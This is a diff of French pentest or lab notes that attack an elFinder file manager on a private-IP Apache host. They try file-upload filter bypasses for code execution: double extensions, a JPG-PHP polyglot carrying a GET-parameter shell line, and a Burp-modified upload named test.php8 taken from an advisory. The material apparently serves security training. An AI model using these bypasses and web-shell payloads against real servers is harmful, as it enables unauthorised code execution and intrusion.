@@ -4,5 +4,42 @@
 80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
 
 http://192.168.53.243:80
-
+elFinder 2.1.x source version vers PHP connector
 On peut upload des fichiers et/ou ouvrir un accès FTP
+
+on va créer un fichier php qui sera accepter par le serveru afin que l'on va injecter pour tenter une RCE
+Unable to upload "drop.php".
+File type not allowed.
+(application/x-php)
+
+MIME type application/x-php
+
+cp drop.sh drop.php.jpg
+Unable to upload "drop.php.jpg".
+File type not allowed.
+(text/x-shellscript)
+
+nano drop.php.jpg 
+<?php phpinfo(); ?>
+
+Unable to upload "drop.php.jpg".
+File type not allowed.
+(text/x-php)
+
+Il faut faire un polyglot propre (vrai image + php discret)
+
+prendre une vrai jpg et faire un cp screen.jpg shell.jpg
+echo '<?=$_GET["cmd"]?>' >> shell.jpg
+mv shell.jpg shell.php.jpg
+
+puis upload -> Accepté
+http://192.168.53.243/files/shell.php.jpg?cmd=id
+ne fonctionne pas,
+
+On va test https://security.snyk.io/vuln/SNYK-PHP-STUDIO42ELFINDER-8320938
+1 - Select arbitrary png file to upload
+2 - Capture request with Burp and set content as test<?php phpinfo();?>
+3 - Set filename like test.php8
+4 - After forwarding the request, the file is successfully uploaded under the files directory
+
+
